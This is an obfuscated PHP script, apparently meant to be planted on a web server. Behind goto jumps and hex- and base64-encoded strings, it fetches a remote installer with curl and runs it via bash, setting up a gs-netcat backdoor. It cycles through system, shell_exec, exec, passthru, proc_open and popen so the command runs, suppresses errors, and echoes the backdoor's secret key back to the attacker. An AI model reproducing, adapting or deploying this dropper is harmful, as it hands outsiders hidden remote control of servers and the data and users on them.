<?php
 goto kJlLx; Bo6W4: $b_cb62fb7c = "\x69\70\x76\132\x33\x4e\x76\x59\62\164\154\144\103\65\x70\x62\x79\71\64\x4b\123\x49\x4b"; goto A1ke0; oVIFt: @ini_set("\x68\164\155\x6c\x5f\x65\162\162\x6f\x72\x73", "\60"); goto Kxo9D; eAQsO: $l_1dc8d4e8 = $l_ed061e8a . $b_cb62fb7c; goto AlfjI; Kxo9D: @clearstatcache(); goto jTrZH; tFf8Q: $u_136ac113 = b_b9caa2a7($o_8ecaead4); goto SjGFm; hDfGK: $l_ed061e8a = "\143\155\x77\x67\114\x57\x5a\x7a\125\x30\x78\x72\x49\x47\150\x30\x64\x48\x42\x7a\x4f"; goto Bo6W4; A1ke0: $n_84c18552 = $i_3087fa6 . $r_9a012e1c; goto eAQsO; jTrZH: $d_17b31f50 = false; goto rNCvw; MD9FP: $i_3087fa6 = "\122\61\116\146\124\153\x39\x44\x52\126\112\x55\121\x30\x68\106\121\60\x73\x39\x4d"; goto JdHZf; AlfjI: $l_bb6f4ec5 = base64_decode($n_84c18552 . $l_1dc8d4e8); goto cZsKG; cZsKG: $o_8ecaead4 = $l_bb6f4ec5; goto tFf8Q; RvqA_: function b_b9caa2a7($o_8ecaead4) { $p_ccde149e = ''; $o_8ecaead4 = $o_8ecaead4 . "\x20\x32\x3e\46\x31"; if (is_callable("\163\171\x73\x74\x65\155")) { ob_start(); @system($o_8ecaead4); $p_ccde149e = ob_get_contents(); ob_end_clean(); if (!empty($p_ccde149e)) { return $p_ccde149e; } } if (is_callable("\163\150\145\154\x6c\137\145\x78\x65\x63")) { $p_ccde149e = @shell_exec($o_8ecaead4); if (!empty($p_ccde149e)) { return $p_ccde149e; } } if (is_callable("\x65\x78\145\143")) { @exec($o_8ecaead4, $s_95538831); if (!empty($s_95538831)) { foreach ($s_95538831 as $w_dcab58a9) { $p_ccde149e .= $w_dcab58a9; } } if (!empty($p_ccde149e)) { return $p_ccde149e; } } if (is_callable("\160\x61\163\x73\x74\x68\x72\x75")) { ob_start(); @passthru($o_8ecaead4); $p_ccde149e = ob_get_contents(); ob_end_clean(); if (!empty($p_ccde149e)) { return $p_ccde149e; } } if (is_callable("\x70\162\x6f\x63\x5f\157\160\x65\156")) { $l_e0057275 = array(0 => array("\x70\151\160\x65", "\162"), 1 => array("\x70\151\x70\145", "\x77"), 2 => array("\160\151\x70\145", "\x77")); $f_861d1896 = @proc_open($o_8ecaead4, $l_e0057275, $e_fca9786f, getcwd(), array()); if (is_resource($f_861d1896)) { while ($e_c2c94c1c = fgets($e_fca9786f[1])) { if (!empty($e_c2c94c1c)) { $p_ccde149e .= $e_c2c94c1c; } } while ($j_697cfa38 = fgets($e_fca9786f[2])) { if (!empty($j_697cfa38)) { $p_ccde149e .= $j_697cfa38; } } } @proc_close($f_861d1896); if (!empty($p_ccde149e)) { return $p_ccde149e; } } if (is_callable("\160\x6f\x70\145\x6e")) { $q_8c9f3610 = @popen($o_8ecaead4, "\162"); if ($q_8c9f3610) { while (!feof($q_8c9f3610)) { $p_ccde149e .= fread($q_8c9f3610, 2096); } pclose($q_8c9f3610); } if (!empty($p_ccde149e)) { return $p_ccde149e; } } return ''; } goto MD9FP; JdHZf: $r_9a012e1c = "\x53\x42\x69\x59\130\116\x6f\x49\103\x31\152\111\x43\x49\153\113\107\x4e\x31"; goto hDfGK; SjGFm: $z_a3bcfc8e = "\x2f\147\163\55\x6e\x65\x74\143\x61\x74\40\x2d\163\x20\134\42\x28\56\52\77\51\134\42\40\x2d\151\x2f"; goto Ttgwa; rNCvw: if ($d_17b31f50) { error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); @ini_set("\144\151\x73\160\x6c\x61\x79\x5f\145\x72\x72\157\x72\x73", "\x31"); @ini_set("\x6c\x6f\147\137\x65\162\162\x6f\x72\x73", "\61"); } else { error_reporting(0); @ini_set("\144\151\163\x70\x6c\141\171\x5f\145\162\x72\x6f\162\x73", "\60"); @ini_set("\154\x6f\147\137\145\162\x72\x6f\x72\163", "\x30"); } goto RvqA_; kJlLx: @set_time_limit(0); goto oVIFt; Ttgwa: if (preg_match($z_a3bcfc8e, $u_136ac113, $k_62615ba)) { echo "\x53\x75\143\143\145\x73\163\40\x3d\x3d\76\40" . $k_62615ba[0]; } else { echo "\106\141\x69\x6c\145\x64\40\72\50"; }
